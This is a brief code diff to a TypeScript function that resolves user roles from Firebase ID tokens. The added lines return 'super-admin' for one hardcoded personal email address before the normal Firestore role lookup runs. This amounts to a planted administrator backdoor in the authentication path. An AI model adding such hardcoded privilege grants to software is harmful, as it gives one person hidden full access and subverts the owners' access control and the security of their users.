@@ -23,6 +23,11 @@ const resolveUserRoleFromToken = async (token: string) => {
     const decoded = await auth.verifyIdToken(token);
     const uid = decoded.uid;
     const email = decoded.email;
+
+    if (email === 'landrymoutongo97@gmail.com') {
+      return 'super-admin';
+    }
+
     let role: string | null = null;
 
     const firestoreDb = (await import('./firebaseAdmin.js')).getDb();
